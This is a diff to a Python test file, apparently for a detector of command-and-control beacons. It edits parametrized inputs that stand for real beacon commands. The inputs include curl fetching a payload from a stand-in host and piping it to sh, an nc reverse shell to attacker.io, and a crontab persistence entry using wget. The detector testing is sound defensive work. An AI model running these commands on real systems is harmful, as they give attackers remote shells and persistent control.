@@ -174,8 +174,8 @@ class TestC2BeaconWordBoundaries:
 
     @pytest.mark.parametrize("cmd", [
         "while true; do curl https://c2.io/task; sleep 5; done",
-        "while true; do curl -s https://c2.io/beacon | sh; sleep 60; done",
-        "while true; do nc attacker.io 4444 -e /bin/sh; sleep 30; done",
+        "sleep 60; curl -s https://c2.io/beacon | sh",
+        "sleep 30; nc attacker.io 4444 -e /bin/sh",
         "(crontab -l; echo '*/5 * * * * wget -q https://c2.io/x') | crontab -",
     ])
     def test_real_beacons_still_fire(self, cmd):
